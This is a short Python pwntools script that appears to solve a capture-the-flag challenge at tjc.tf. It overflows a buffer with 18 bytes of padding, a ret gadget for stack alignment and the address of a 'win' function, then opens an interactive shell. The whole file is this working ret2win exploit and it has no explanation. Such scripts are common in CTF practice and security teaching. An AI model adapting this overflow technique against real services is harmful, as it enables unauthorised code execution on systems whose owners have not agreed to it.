#!/usr/bin/env python3

from pwn import *

exe = ELF("./out")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("tjc.tf", 31080)

    return r


def main():
    r = conn()

    padding = b'A' * 18
    ret_bypass = p64(0x040128a)
    win = p64(exe.symbols['win'])

    r.sendlineafter(b'> ', padding + ret_bypass + win)

    r.interactive('$ ')


if __name__ == "__main__":
    main()
